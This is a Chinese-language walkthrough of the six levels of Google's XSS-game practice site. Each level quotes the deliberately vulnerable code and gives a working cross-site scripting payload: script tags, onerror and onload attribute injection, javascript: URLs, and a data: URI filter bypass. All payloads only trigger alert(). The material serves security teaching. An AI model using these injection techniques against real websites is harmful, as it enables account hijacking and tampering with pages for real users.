# XSS-game

* https://xss-game.appspot.com/level1


## [[1/6]  Level 1: Hello, world of XSS](https://xss-game.appspot.com/level1)


![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled.png)

- **Target code**
    
    ```python
    def get(self):
        # Disable the reflected XSS filter for demonstration purposes
        self.response.headers.add_header("X-XSS-Protection", "0")
     
        if not self.request.get('query'):
          # Show main search page
          self.render_string(page_header + main_page_markup + page_footer)
        else:
          query = self.request.get('query', '[empty]')
           
          # Our search engine broke, we found no results :-(
          message = "Sorry, no results were found for <b>" + query + "</b>."
          message += " <a href='?'>Try again</a>."
     
          # Display the results page
          self.render_string(page_header + message + page_footer)
         
        return
    ```
    

以上這段原始碼注意到以下

- `self.response.headers.add_header("X-XSS-Protection", "0")` 把 XSS 保護關閉。
- 下方這段可以發現他會直接將輸入嵌入至 message 中。
    
    ```python
    # Our search engine broke, we found no results :-(
    message = "Sorry, no results were found for <b>" + query + "</b>."
    message += " <a href='?'>Try again</a>."
    ```
    

綜上所述，因此只需要對輸入框輸入並執行以下 payload 即可。

```cpp
<script>alert()</script>
```

## **[[2/6]  Level 2: Persistence is key](https://xss-game.appspot.com/level2)**


![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled%201.png)

- **Target code**
    
    ```html
    var posts = DB.getPosts();
    for (var i=0; i<posts.length; i++) {
        var html = '<table class="message"> <tr> <td valign=top> '
        + '<img src="/static/level2_icon.png"> </td> <td valign=top '
        + ' class="message-container"> <div class="shim"></div>';
     
        html += '<b>You</b>';
        html += '<span class="date">' + new Date(posts[i].date) + '</span>';
        html += "<blockquote>" + posts[i].message + "</blockquote";
        html += "</td></tr></table>"
        containerEl.innerHTML += html; 
    }
    ```
    

從以上的 HTML 原始碼可以得知其在對 post 進行解析輸出時並未添加任何過濾機制。但要注意得是 `containerEl.innerHTML += html;` 是指使用將 `html` ****字符串添加到 `containerEl` 元素的內容之後，這些 `<script>` 元素將被視為純文字而不是執行腳本。這樣做是為了防止不受信任的內容注入到網頁中，從而保護使用者的安全。

`innerHTML` 是 JavaScript 中 DOM（Document Object Model）元素的屬性之一，允許設置或獲取 HTML 元素的內容。使用 `innerHTML`可以動態地修改元素的內容。

因此需要透過 HTML 來觸發 JS 腳本，從而達到目的。

以下提供幾種方法：

- **使用事件屬性**：在 HTML 元素上添加事件屬性，當特定事件發生時，該屬性中的 JavaScript 代碼將被執行。
    
    ```html
    <button onclick="alert()">Click Me</button>
    ```
    
    ```html
    <img src="" onerror="alert()">
    ```
    
    ```html
    <a href="javascript:alert()">Link</a>
    ```
    

## **[[3/6]  Level 3: That sinking feeling...](https://xss-game.appspot.com/level3)**


![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled%202.png)

- **Target code**
    
    ```jsx
    function chooseTab(num) {
            // Dynamically load the appropriate image.
            var html = "Image " + parseInt(num) + "<br>";
            html += "<img src='/static/level3/cloud" + num + ".jpg' />";
            $('#tabContent').html(html);
     
            window.location.hash = num;
     
            // Select the current tab
            var tabs = document.querySelectorAll('.tab');
            for (var i = 0; i < tabs.length; i++) {
              if (tabs[i].id == "tab" + parseInt(num)) {
                tabs[i].className = "tab active";
                } else {
                tabs[i].className = "tab";
              }
            }
    ```
    

透過原始碼可以發現在 img 載入的地方是使用`"<img src='/static/level3/cloud" + num + ".jpg' />";` 字串的方式進行串接，所以只要多增加 `onerror=` 屬性，當 img 載入錯誤時觸發 `onerror` 即可。

使用以下 payload

```html
X' onerror="alert()" '
```

## **[[4/6]  Level 4: Context matters](https://xss-game.appspot.com/level4)**


![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled%203.png)

- **Target code**
    - index.html
        
        ```html
        <!doctype html>
        <html>
          <head>
            <!-- Internal game scripts/styles, mostly boring stuff -->
            <script src="/static/game-frame.js"></script>
            <link rel="stylesheet" href="/static/game-frame-styles.css" />
          </head>
         
          <body id="level4">
            <img src="/static/logos/level4.png" />
            <br>
            <form action="" method="GET">
              <input id="timer" name="timer" value="3">
              <input id="button" type="submit" value="Create timer"> </form>
            </form>
          </body>
        </html>
        ```
        
    - timer.html
        
        ```html
        <!doctype html>
        <html>
          <head>
            <!-- Internal game scripts/styles, mostly boring stuff -->
            <script src="/static/game-frame.js"></script>
            <link rel="stylesheet" href="/static/game-frame-styles.css" />
         
            <script>
              function startTimer(seconds) {
                seconds = parseInt(seconds) || 3;
                setTimeout(function() { 
                  window.confirm("Time is up!");
                  window.history.back();
                }, seconds * 1000);
              }
            </script>
          </head>
          <body id="level4">
            <img src="/static/logos/level4.png" />
            <br>
            <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
            <br>
            <div id="message">Your timer will execute in {{ timer }} seconds.</div>
          </body>
        </html>
        ```
        

注意到其中 `<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />` 的 `onload=`屬性。

且可以看到 index.html 中，timer 是由使用者輸入的，並且透過`seconds = parseInt(seconds) || 3;`可以得知預設是 3 秒，所以只要將 timer 改成有辦法呼叫 `alert()`即可。

透過以下 payload 將其竄改

```html
');alert();a('
```

則上述 img tag 的那串程式會被修改成以下

```html
<img src="/static/loading.gif" onload="startTimer('{{');alert();a('}}');"/>
```

## **[[5/6]  Level 5: Breaking protocol](https://xss-game.appspot.com/level5)**


- **Target code**
    - signup.html
        
        ```html
        <!doctype html>
        <html>
          <head>
            <!-- Internal game scripts/styles, mostly boring stuff -->
            <script src="/static/game-frame.js"></script>
            <link rel="stylesheet" href="/static/game-frame-styles.css" />
          </head>
         
          <body id="level5">
            <img src="/static/logos/level5.png" /><br><br>
            <!-- We're ignoring the email, but the poor user will never know! -->
            Enter email: <input id="reader-email" name="email" value="">
         
            <br><br>
            <a href="{{ next }}">Next >></a>
          </body>
        </html>
        ```
        
    - confirm.html
        
        ```html
        <!doctype html>
        <html>
          <head>
            <!-- Internal game scripts/styles, mostly boring stuff -->
            <script src="/static/game-frame.js"></script>
            <link rel="stylesheet" href="/static/game-frame-styles.css" />
          </head>
         
          <body id="level5">
            <img src="/static/logos/level5.png" /><br><br>
            Thanks for signing up, you will be redirected soon...
            <script>
              setTimeout(function() { window.location = '{{ next }}'; }, 5000);
            </script>
          </body>
        </html>
        ```
        
    - welcome.html
        
        ```html
        <!doctype html>
        <html>
          <head>
            <!-- Internal game scripts/styles, mostly boring stuff -->
            <script src="/static/game-frame.js"></script>
            <link rel="stylesheet" href="/static/game-frame-styles.css" />
          </head>
         
          <body id="level5">
            Welcome! Today we are announcing the much anticipated<br><br>
            <img src="/static/logos/level5.png" /><br><br>
         
            <a href="/level5/frame/signup?next=confirm">Sign up</a> 
            for an exclusive Beta.
          </body>
        </html>
        ```
        
    
    可以注意到 URL 出現了參數的形式
    
    ```html
    next=confirm
    ```
    
    ![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled%204.png)
    
    ```html
    <a href="{{ next }}">Next >></a>
    ```
    
    表示 next 作為 `GET` 參數，當使用者按下 Next 時，confirm 就會作為 next 的值，之後跳轉到 confirm.html 頁面。
    
    因此可以嘗試透過  URL 觸發 js
    
    嘗試以下 payload
    
    ```html
    https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
    ```
    
    ## **[[6/6]  Level 6: Follow the 🐇](https://xss-game.appspot.com/level6)**
    
    ![Untitled](XSS-game%2056d250f01c1a4380afd46848c2319fac/Untitled%205.png)
    
    ```jsx
    https://xss-game.appspot.com/level6/frame#/static/gadget.js
    ```
    
    - **Target code**
        
        ```jsx
        function includeGadget(url) {
              var scriptEl = document.createElement('script');
         
              // This will totally prevent us from loading evil URLs!
              if (url.match(/^https?:\/\//)) {
                setInnerText(document.getElementById("log"),
                  "Sorry, cannot load a URL containing \"http\".");
                return;
              }
         
              // Load this awesome gadget
              scriptEl.src = url;
         
              // Show log messages
              scriptEl.onload = function() { 
                setInnerText(document.getElementById("log"),  
                  "Loaded gadget from " + url);
              }
              scriptEl.onerror = function() { 
                setInnerText(document.getElementById("log"),  
                  "Couldn't load gadget from " + url);
              }
         
              document.head.appendChild(scriptEl);
            }
        ```
        
    
    最前面會先檢查 URL 中是否為 http:// 或 https://。所以不能使用 http:// 或 https:// 來引入外部檔案。
    
    Data URI Scheme 是一種用於在 URL 中直接嵌入資料的方法，允許將資料以 Base64 編碼的形式直接放在 URL 中，而不需要單獨請求一個外部文件。
    
    - 格式
        
        ```jsx
        data:[<mediatype>][;base64],<data>
        ```
        
    
    可以嘗試以下 payload 
    
    ```jsx
    https://xss-game.appspot.com/level6/frame#data:application/javascript,alert()
    ```
    
    當你打開這個 URL 時，頁面會載入一個包含 `iframe` 元素的 HTML 檔案。這個 `iframe` 的 `src` 屬性設置為 `data:application/javascript,alert()`，表示其內容是一個包含 JavaScript 程式碼的 Data URI。
    
    由於瀏覽器在載入這個 `iframe` 時，會解析其中的 js 並執行它，所以當你打開這個 URL 時，瀏覽器會彈出一個對話框顯示 "Alert"，即 `alert()` 函數執行的結果。
    
    ```jsx
    https://xss-game.appspot.com/level6/frame#data:text/plain,alert()
    ```
    
    這段則是代表純文字的 Data URL。